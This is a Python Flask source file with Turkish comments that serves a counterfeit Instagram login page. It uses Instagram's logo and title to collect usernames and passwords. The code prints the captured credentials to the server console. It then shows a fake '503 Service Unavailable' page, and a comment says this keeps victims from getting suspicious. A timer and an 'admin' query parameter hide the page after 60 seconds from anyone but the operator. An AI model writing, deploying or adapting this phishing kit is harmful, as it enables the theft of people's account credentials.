import os, time
from flask import Flask, request, render_template_string, abort

app = Flask(__name__)

# Sitenin ilk açıldığı anı kaydeder
START_TIME = time.time()

# --- INSTAGRAM GİRİŞ SAYFASI ---
HTML_TASARIM = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 12px; }
        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511109452.png" class="logo">
        <form method="POST" action="/login">
            <input type="text" name="u" placeholder="Kullanıcı adı veya e-posta" required>
            <input type="password" name="p" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

# --- 60 SANİYE DOLUNCA GÖRELECEK SAHTE HATA SAYFASI ---
HATA_SAYFASI = """
<!DOCTYPE html>
<html>
<head><title>503 Service Unavailable</title></head>
<body style="font-family: sans-serif; text-align: center; padding-top: 50px;">
    <h1>503 Service Unavailable</h1>
    <p>The server is temporarily unable to service your request due to maintenance downtime or capacity problems. Please try again later.</p>
</body>
</html>
"""

@app.route('/')
def home():
    elapsed = time.time() - START_TIME
    is_admin = request.args.get('admin') == '1'
    
    # 60 saniye dolduysa ve admin değilsen 'Hata' sayfasını göster (Instagram'a atmaz)
    if elapsed > 60 and not is_admin:
        return render_template_string(HATA_SAYFASI), 503
    
    return render_template_string(HTML_TASARIM)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('u')
    pw = request.form.get('p')
    print(f"--- VERI GELDI --- Kullanici: {user} | Sifre: {pw}")
    # Giriş yaptıktan sonra da hata sayfasına yolla ki şüphelenmesin
    return render_template_string(HATA_SAYFASI), 503

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
